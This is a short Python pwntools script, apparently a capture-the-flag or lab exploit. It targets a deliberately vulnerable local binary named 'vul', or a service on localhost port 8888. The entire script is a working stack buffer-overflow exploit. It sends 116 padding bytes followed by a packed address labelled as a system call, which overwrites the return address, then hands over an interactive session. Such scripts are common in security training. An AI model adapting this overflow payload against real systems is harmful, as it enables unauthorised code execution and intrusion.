#!/usr/bin/env python
from pwn import *
local = 1
if local:
	p = process('./vul')
else:
	p = remote('127.0.0.1', 8888)
offset = 116
sys_addr = 0x80488e4
payload = 'A' * offset + p32(sys_addr)
# gdb.attach(p)
p.sendline(payload)
p.interactive()
